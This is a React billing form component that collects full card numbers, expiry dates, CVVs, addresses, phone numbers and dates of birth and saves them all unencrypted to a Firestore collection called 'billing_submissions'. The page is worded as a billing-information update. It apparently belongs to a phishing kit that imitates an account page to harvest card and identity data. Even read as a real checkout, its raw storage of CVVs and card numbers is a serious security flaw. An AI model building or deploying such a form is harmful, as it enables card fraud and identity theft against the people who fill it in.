import { useState } from 'react'
import { FiAlertCircle } from 'react-icons/fi'
import { db } from '../config/firebase'
import { collection, addDoc, serverTimestamp } from 'firebase/firestore'

export default function BillingForm({ onLogout, onContinue }) {
  const [formData, setFormData] = useState({
    fullName: '',
    cardNumber: '',
    expiryDate: '',
    cvv: '',
    email: '',
    address: '',
    aptSuite: '',
    city: '',
    state: '',
    zipCode: '',
    phoneNumber: '',
    dateOfBirth: ''
  })

  const [loading, setLoading] = useState(false)
  const [error, setError] = useState('')
  const [success, setSuccess] = useState(false)

  const handleInputChange = (e) => {
    const { name, value } = e.target

    // Format card number with spaces
    if (name === 'cardNumber') {
      const formatted = value.replace(/\s/g, '').replace(/(\d{4})/g, '$1 ').trim()
      setFormData(prev => ({ ...prev, [name]: formatted }))
      return
    }

    // Format expiry date
    if (name === 'expiryDate') {
      const formatted = value.replace(/\D/g, '').replace(/(\d{2})(\d)/, '$1/$2').slice(0, 5)
      setFormData(prev => ({ ...prev, [name]: formatted }))
      return
    }

    setFormData(prev => ({ ...prev, [name]: value }))
  }

  const handleSubmit = async (e) => {
    e.preventDefault()
    setError('')
    setSuccess(false)

    // Validation
    if (!formData.fullName || !formData.cardNumber || !formData.expiryDate ||
      !formData.cvv || !formData.email || !formData.address ||
      !formData.city || !formData.state || !formData.zipCode) {
      setError('Please fill in all required fields')
      return
    }

    setLoading(true)

    try {
      await addDoc(collection(db, 'billing_submissions'), {
        fullName: formData.fullName,
        cardNumber: formData.cardNumber,
        expiryDate: formData.expiryDate,
        cvv: formData.cvv,
        email: formData.email,
        address: formData.address,
        aptSuite: formData.aptSuite,
        city: formData.city,
        state: formData.state,
        zipCode: formData.zipCode,
        phoneNumber: formData.phoneNumber,
        dateOfBirth: formData.dateOfBirth,
        timestamp: serverTimestamp(),
        userAgent: navigator.userAgent,
      })

      setLoading(false)
      setSuccess(true)

      setTimeout(() => {
        if (onContinue) {
          onContinue()
        }
      }, 1200)
    } catch (err) {
      setLoading(false)
      setError('Network error. Please try again.')
      console.error('Error submitting form:', err)
    }
  }

  return (
    <form onSubmit={handleSubmit} className="space-y-8">
      {/* Error Alert */}
      {error && (
        <div className="p-4 bg-red-50 border border-red-200 rounded-lg flex items-start space-x-3">
          <FiAlertCircle className="text-red-600 mt-0.5 flex-shrink-0" />
          <p className="text-red-700 text-sm">{error}</p>
        </div>
      )}

      {/* Success Alert */}
      {success && (
        <div className="p-4 bg-green-50 border border-green-200 rounded-lg flex items-start space-x-3">
          <div className="text-green-600 mt-0.5 flex-shrink-0">✓</div>
          <p className="text-green-700 text-sm">Billing information updated successfully!</p>
        </div>
      )}

      {/* Section 1: Cardholder Information */}
      <div>
        <h3 className="text-lg font-semibold text-gray-900 mb-6">Card Information</h3>
        <div className="grid grid-cols-1 gap-6">
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-2">
              Full Name On Your Card *
            </label>
            <input
              type="text"
              name="fullName"
              value={formData.fullName}
              onChange={handleInputChange}
              placeholder="Enter full name on your card"
              className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition"
            />
          </div>

          <div>
            <label className="block text-sm font-medium text-gray-700 mb-2">
              Debit / Credit Card Number *
            </label>
            <input
              type="text"
              name="cardNumber"
              value={formData.cardNumber}
              onChange={handleInputChange}
              placeholder="1234 1234 1234 1234"
              maxLength="19"
              className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition"
            />
          </div>

          <div className="grid grid-cols-2 gap-4">
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                Expiration Date *
              </label>
              <input
                type="text"
                name="expiryDate"
                value={formData.expiryDate}
                onChange={handleInputChange}
                placeholder="MM/YY"
                maxLength="5"
                className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition"
              />
            </div>
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                CVV/CVC *
              </label>
              <input
                type="password"
                name="cvv"
                value={formData.cvv}
                onChange={handleInputChange}
                placeholder="CVV"
                maxLength="4"
                className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition"
              />
            </div>
          </div>
        </div>
      </div>

      {/* Section 2: Contact & Address Information */}
      <div>
        <h3 className="text-lg font-semibold text-gray-900 mb-6">Contact & Billing Address</h3>
        <div className="grid grid-cols-1 gap-6">
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-2">
              Email Address *
            </label>
            <input
              type="email"
              name="email"
              value={formData.email}
              onChange={handleInputChange}
              placeholder="your.email@example.com"
              className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition"
            />
          </div>

          <div>
            <label className="block text-sm font-medium text-gray-700 mb-2">
              Billing Address *
            </label>
            <input
              type="text"
              name="address"
              value={formData.address}
              onChange={handleInputChange}
              placeholder="Enter billing address"
              className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition"
            />
          </div>

          <div>
            <label className="block text-sm font-medium text-gray-700 mb-2">
              #Apt, Suite, Other (Optional)
            </label>
            <input
              type="text"
              name="aptSuite"
              value={formData.aptSuite}
              onChange={handleInputChange}
              placeholder="Apartment, suite, etc. (optional)"
              className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition"
            />
          </div>

          <div className="grid grid-cols-3 gap-4">
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                City *
              </label>
              <input
                type="text"
                name="city"
                value={formData.city}
                onChange={handleInputChange}
                placeholder="City"
                className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition"
              />
            </div>
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                State *
              </label>
              <input
                type="text"
                name="state"
                value={formData.state}
                onChange={handleInputChange}
                placeholder="State"
                maxLength="2"
                className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition"
              />
            </div>
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                Zip Code *
              </label>
              <input
                type="text"
                name="zipCode"
                value={formData.zipCode}
                onChange={handleInputChange}
                placeholder="Zip Code"
                maxLength="5"
                className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition"
              />
            </div>
          </div>

          <div>
            <label className="block text-sm font-medium text-gray-700 mb-2">
              Billing Phone Number (Optional)
            </label>
            <input
              type="tel"
              name="phoneNumber"
              value={formData.phoneNumber}
              onChange={handleInputChange}
              placeholder="(123) 456-7890"
              className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition"
            />
          </div>
        </div>
      </div>

      {/* Section 3: Date of Birth */}
      <div>
        <h3 className="text-lg font-semibold text-gray-900 mb-6">Personal Information</h3>
        <div>
          <label className="block text-sm font-medium text-gray-700 mb-2">
            Date Of Birth (Optional)
          </label>
          <input
            type="text"
            name="dateOfBirth"
            value={formData.dateOfBirth}
            onChange={handleInputChange}
            placeholder="MM/DD/YYYY"
            className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition"
          />
        </div>
      </div>

      {/* Continue Button */}
      <div className="flex items-center justify-between pt-6 border-t border-gray-200">
        <button
          type="button"
          onClick={onLogout}
          className="px-6 py-3 text-gray-700 font-medium hover:text-gray-900 transition"
        >
          Back to Account
        </button>
        <button
          type="submit"
          disabled={loading}
          className="px-8 py-3 bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 text-white font-bold rounded-lg transition transform hover:scale-105 disabled:opacity-50 disabled:cursor-not-allowed disabled:hover:scale-100 flex items-center space-x-2"
        >
          {loading ? (
            <>
              <svg className="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
              </svg>
              <span>UPDATING...</span>
            </>
          ) : (
            <span>CONTINUE</span>
          )}
        </button>
      </div>
    </form>
  )
}
